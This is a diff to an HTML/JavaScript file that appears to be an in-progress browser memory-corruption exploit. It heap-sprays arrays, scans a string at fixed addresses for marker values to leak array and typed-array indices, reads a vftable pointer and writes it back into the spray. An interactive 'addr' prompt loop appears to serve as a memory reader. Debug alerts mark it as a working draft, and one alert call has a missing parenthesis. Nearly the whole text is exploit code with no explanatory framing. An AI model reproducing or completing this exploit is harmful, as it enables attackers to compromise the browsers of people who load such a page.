@@ -1,5 +1,5 @@
 <script>	
-alert("start15");
+alert("start16");
 var spray=new Array(0x800);
 var tmp;
  for(var i=0;i<spray.length;i+=2){
@@ -84,6 +84,22 @@ alert("ok");
 
 var a=0;
 var b="";
+a=0x50000000/2;
+while(s1.charCodeAt(a)!=0xAA00){
+ a+=1;
+}
+var spray_index=s1.charCodeAt(a-1);
+var typedarray_index=s1.charCodeAt(a+1);
+a=0x50010000/2;
+while(s1.charCodeAt(a)!=0xFFFB){
+ a+=1;
+}
+var arr_addr=(s1.charCodeAt(a-1)<<16)+s1.charCodeAt(a-2)
+alert(arr_addr.toString(16));
+a=arr_addr/2;
+var vftable=s1.charCodeAt(a)+(s1.charCodeAt(a+1)<<16);
+alert(vftable.toString(16);
+spray[spray_index][typedarray_index]=vftable;
 while(1){
 a=prompt("addr");
 b="";
